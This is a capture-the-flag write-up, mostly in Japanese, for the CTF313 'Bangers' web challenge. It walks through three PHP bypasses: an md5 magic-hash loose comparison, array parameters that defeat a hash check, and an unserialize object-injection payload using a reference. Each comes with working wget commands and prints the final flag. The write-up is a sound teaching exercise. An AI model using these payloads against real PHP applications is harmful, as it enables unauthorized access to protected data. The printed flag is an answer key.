# BANGERS!:Web:15pts
Banger. A CTF challenge that makes you feel the need to headbang to the beat of your keyboard. CTF313's Web03 challenge is full of bangers. Check it out if your tryin to rage!  
In Scope: http://web03.ctf313.com/  
Hack the web app only. You have the source code, no need to brute force or spam anything.  
Server and Infrastructure are out of scope and will result in an automatic ban and public shaming for being a 💩.  

# Solution
URLにアクセスするとphpソースが表示される。  
段階的にロックを突破するようだ。  
Web03 Challenge "Bangers"  
[site.png](site/site.png)  
最初は以下の部分に注目する。  
```php
$taws = $_GET['taws'];
if($taws != md5($taws)){
    die("Your Dead");
}

echo substr($flag,0,15) . "\n";
```
入力とmd5ハッシュ値を比較しているが厳密等価演算子ではない。  
つまり0eで始まり、残りが数字となる値は0と見なされる。  
0eから始まる入力で、ハッシュ値が0eから始まるものは、入力`0e215962017`、ハッシュ値`0e291242476940776845150308577824`が知られている。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://web03.ctf313.com/?taws=0e215962017"
flag{H4xor1N9-P
Death has found you
```
次に以下の部分に注目する。  
```php
$tabernacle = $_GET['tabernacle']; 
$quantile = $_GET['quantile']; 


if(!($tabernacle) || !($quantile)){
    die("Death has found you");
}

if ($tabernacle === $quantile) {
    die("There are many ways to die. You seem to find them easily");
}

if (hash('md5', $saltysalt . $tabernacle) == hash('md5', $saltysalt . $quantile)) {
    echo substr($flag, 0, 30) . "\n";
} else {
    die("Patched this booboo srynotsry");
}
```
`$saltysalt`がつけられた二つの入力のmd5ハッシュ値を比較している。  
二つの入力は異なる必要があるようだ。  
配列を渡すことで`$saltysalt . "Array"`になる。  
これにより厳密等価演算子を突破し、md5ハッシュ値を一致させることができる。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - "http://web03.ctf313.com/?taws=0e215962017&tabernacle[]=a&quantile[]=b"
flag{H4xor1N9-P
flag{H4xor1N9-PhP-15-4LL-4BoU7
Bang, you dead
```
最後に以下の部分に注目する。  
```php
class Wutang {
    var $wut;
    var $ang;
}

$gat = $_GET['gat'];

if (!($gat)) {
    die("Bang, you dead");
}

$banger = unserialize($gat);

if ($banger) {

    $banger->ang=$flag;
    if ($banger->ang === $banger->wut) {
        echo $banger->ang ."\n";
    } else {
        die("Death Brought BANGERS");
    }

} else {

    die("Ba-ba-ba BANGERRR. Dead.");
}
```
unserializeしたオブジェクトの`$ang`にflagを代入している。  
それが`$wut`と一致してほしいので、参照させればよい。  
よって`O:6:"Wutang":2:{s:3:"ang";N;s:3:"wut";R:2;}`となる。  
以下のようにクエリを設定した。  
```bash
$ wget -q -O - 'http://web03.ctf313.com/?taws=0e215962017&tabernacle[]=a&quantile[]=b&gat=O:6:"Wutang":2:{s:3:"ang";N;s:3:"wut";R:2;}'
flag{H4xor1N9-P
flag{H4xor1N9-PhP-15-4LL-4BoU7
flag{H4xor1N9-PhP-15-4LL-4BoU7-coMP4R15ON5-4Nd-lUlz}
```
flagが得られた。  

## flag{H4xor1N9-PhP-15-4LL-4BoU7-coMP4R15ON5-4Nd-lUlz}